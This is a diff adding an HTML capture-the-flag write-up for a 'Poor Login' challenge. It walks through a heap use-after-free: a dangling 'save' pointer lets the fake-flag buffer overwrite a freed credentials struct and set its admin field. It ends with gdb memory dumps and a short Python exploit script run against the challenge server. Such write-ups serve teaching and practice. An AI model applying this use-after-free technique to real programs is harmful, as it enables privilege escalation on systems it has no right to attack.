@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Poor Login</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Poor Login</h1>
+</header>
+<p>The program allows us to login, sign out, print flag, lock and restore user. Login <code>malloc</code> a block of memory on heap, it takes the 31 bytes input for username, adds 1 byte for end of string, allocated user is pointed to by <code>curr</code> pointer. Sign out free the address that <code>curr</code> points to. Lock user operation makes <code>save</code> pointer points to same address as <code>curr</code> does, while restore operation does the opposite, it points <code>curr</code> to address pointed to by <code>save</code>. If <code>admin</code> field is set print flag operation call <code>system</code> to print out the flag, otherwise, it allows us to input a fake one.</p>
+<pre><code>struct creds {
+  void *padding;
+  char name[32];
+  int admin;
+};
+
+struct creds *curr;
+struct creds *save;
+
+char *fake_flag;
+</code></pre>
+<p>Login the first time with username <code>aaaaaaaabbbbbbbbccccccccddddddd</code>.</p>
+<pre><code>0x5555556032a0: 0x0000000000000000      0x6161616161616161
+0x5555556032b0: 0x6262626262626262      0x6363636363636363
+0x5555556032c0: 0x0064646464646464      0x0000000000000000
+0x5555556032d0: 0x0000000000000000      0x0000000000020d31
+0x5555556032e0: 0x0000000000000000      0x0000000000000000</code></pre>
+<p>Lock user to make <code>save</code> point to <code>curr</code>, logout current user to free <code>curr</code>, but <code>save</code> pointer still points to address <code>0x5555556032a0</code>.</p>
+<pre><code>0x5555556032a0: 0x0000000000000000      0x0000555555603010
+0x5555556032b0: 0x6262626262626262      0x6363636363636363
+0x5555556032c0: 0x0064646464646464      0x0000000000000000
+0x5555556032d0: 0x0000000000000000      0x0000000000020d31
+0x5555556032e0: 0x0000000000000000      0x0000000000000000</code></pre>
+<p>Print flag now we are allowed to input a fake flag, <code>fake_flag</code> pointer will be allocated an area that previously freed and pointed to by <code>save</code> pointer. We need to input enough bytes to cover the struct so that <code>admin</code> field could be set to 1.</p>
+<pre><code>0x5555556032a0: 0x3131313131313131      0x3131313131313131
+0x5555556032b0: 0x3131313131313131      0x3131313131313131
+0x5555556032c0: 0x3131313131313131      0x3131313131313131
+0x5555556032d0: 0x000000000000000a      0x0000000000020d31
+0x5555556032e0: 0x0000000000000000      0x0000000000000000</code></pre>
+<p>Now we restore user to reuse data pointed to by <code>save</code> pointer. Print again flag, as this moment the <code>admin</code> field is set to 1, we are able to get to the call to <code>system</code> function.</p>
+<pre><code>*** WINBLOWS LOGIN *********
+1. Login into user.
+2. Sign out.
+3. Print flag.
+4. Lock user.
+5. Restore user.
+&gt; 3
+Here&#39;s your flag:
+[Detaching after vfork from child process 8343]
+/bin/cat: /flag.txt: No such file or directory</code></pre>
+<p>Repeat the operations on server to get the flag.</p>
+<pre><code>menu = Menu(remote)
+
+menu.login(&#39;A&#39;*31)
+menu.lock_user()
+menu.sign_out()
+menu.print_flag(b&#39;\x01&#39;*40)
+menu.restore_user()
+menu.print_flag(&quot;&quot;)</code></pre>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
